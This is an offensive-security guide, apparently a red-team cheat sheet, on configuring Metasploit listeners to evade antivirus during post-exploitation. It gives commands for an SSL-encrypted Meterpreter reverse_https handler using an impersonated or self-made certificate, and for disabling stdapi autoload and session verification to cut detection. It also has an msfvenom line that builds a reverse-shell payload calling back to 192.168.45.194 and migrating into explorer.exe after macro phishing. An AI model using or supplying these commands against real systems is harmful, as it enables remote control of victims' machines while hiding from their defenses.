
# Metasploit Listener Configuration

This guide provides advanced Metasploit `multi/handler` module options that can help you bypass anti-virus detection and improve stealth during post-exploitation. These configurations include using SSL for encrypted communication and disabling certain features that are often flagged by anti-virus software.

## 1. Using SSL for Encrypted Communication

Metasploit allows you to use SSL for encrypted connections by setting the `SSL` option to `true`. You can use a custom self-signed certificate for this purpose. Below are the steps to configure the listener with SSL.

### Generate or Impersonate an SSL Certificate
You can impersonate an SSL certificate using the following Metasploit module:

```bash
# Impersonate an SSL Certificate
use auxiliary/gather/impersonate_ssl
set RHOSTS www.github.com
exploit
```
### Optionally, self generate a cert with OpenSSL
```bash
# PowerShell
. "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" req -new -newkey rsa:2048 -x509 -sha256 -days 365 -nodes -keyout priv.key -out cert.crt -subj "/C=GB/ST=England/L=London/O=FictionalLtd/OU=IT Department/CN=fictionalltd.co.uk/emailAddress=admin@fictionalltd.co.uk" > $null 2>&1; Get-Content priv.key, cert.crt | Set-Content Certificate.pem; $fullPath = (Get-Item Certificate.pem).FullName.Replace('\', '/'); Write-Output "`n`n[+] Done! `n[*] Run in Metasploit: `n[*] set HandlerSSLCert $fullPath"

# Linux
openssl req -new -newkey rsa:2048 -x509 -sha256 -days 365 -nodes -keyout priv.key -out cert.crt -subj "/C=GB/ST=England/L=London/O=FictionalLtd/OU=IT Department/CN=fictionalltd.co.uk/emailAddress=admin@fictionalltd.co.uk" >/dev/null 2>&1 && cat priv.key cert.crt > Certificate.pem && fullPath=$(realpath Certificate.pem) && echo -e "\n\n[+] Done! \n[*] Run in Metasploit: \n[*] set HandlerSSLCert $fullPath"

# When using Linux, ensure SSL is configured as such
# Open openssl.cnf
nano /etc/ssl/openssl.cnf

# Ensure CipherString is set to the value below
CipherString=DEFAULT
```

### Configure the Metasploit Listener with SSL

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST <your_ip>
set LPORT <your_port>
set HandlerSSLCert C:/Users/Hacker/Desktop/Certificate.pem
set StagerVerifySSLCert true
exploit
```

This configuration enables SSL for the listener and uses the specified certificate (`Certificate.pem`) for the connection. This helps encrypt the communication between the client and the server, reducing the chance of detection.

## 2. Disabling AutoLoading of `stdapi`

The `stdapi` extension in Meterpreter provides default commands and functionality, but it can be detected by anti-virus due to its signature in memory. To avoid detection, you can disable the automatic loading of `stdapi` and load it manually after the session is established.

### Disable `stdapi` Autoloading

```bash
set AutoLoadStdapi false
```

This prevents the `stdapi` extension from loading automatically, which can make the Meterpreter session appear less suspicious.

### Manually Load `stdapi` After Gaining a Shell

Once the reverse shell is established, you can manually load `stdapi` to gain full Meterpreter functionality:

```bash
meterpreter> load stdapi
```

## 3. Disabling `AutoVerifySession`

The `AutoVerifySession` option sends an additional connection to verify the session's health. This behavior can also be flagged by anti-virus systems. Disabling it reduces the noise generated by the connection.

### Disable AutoVerifySession

```bash
set AutoVerifySession false
```

This reduces the likelihood of anti-virus detection by limiting the number of connections initiated by Meterpreter.

## 4. Patience
If a meterpreter shell session has been established. Be patient, wait a minimum of 10 minutes before loading stdapi and dropping into a shell. Letting the shell "mature" before operating helps reduce detection.

## 5. Process Migration
In some instances, it may be necessary to migrate off a process. For example, if phishing with Macros the process will spawn under word (WINWORD.exe). Metasploit can be configured to migrate over to a more stable process such as explorer.exe, in the event WINWORD.exe is terminated.

```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.194 LPORT=8080 -f csharp prependmigrateproc=explorer.exe prependmigrate=true
```
